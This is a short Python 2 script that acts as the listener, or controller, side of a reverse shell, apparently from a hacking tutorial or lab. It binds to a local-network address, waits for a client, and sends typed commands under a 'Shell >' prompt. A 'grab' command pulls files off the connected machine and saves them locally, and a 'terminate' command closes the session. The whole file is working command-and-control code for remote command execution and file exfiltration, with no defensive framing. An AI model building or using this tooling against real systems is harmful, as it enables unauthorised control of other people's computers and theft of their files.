import socket

def transfer(conn, command):

    conn.send(command)
    f = open('/root/Desktop/somefile', 'wb')
    while True:
        bits = conn.recv(1024)
        if 'File not found' in bits:
            print '[-] File not found'
            break
        if bits.endswith('DONE'):
            print '[-] File transfer complete'
            f.close()
            break
        f.write(bits)
    f.close()


def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('192.168.233.128', 8080))
    s.listen(1)
    conn, addr = s.accept()
    print '[+] Connection from ' + str(addr)


    while True:

        command = raw_input("Shell > " )

        if 'terminate' in command:
            #Send terminate signal to the client
            conn.send('terminate')
            #Close the connection to the client on the server end
            conn.close()
            break

        if 'grab' in command:
            transfer(conn, command)

        else:
            conn.send(command)
            print conn.recv(1024)

def main():
    connect()


if __name__ == '__main__':
    main()
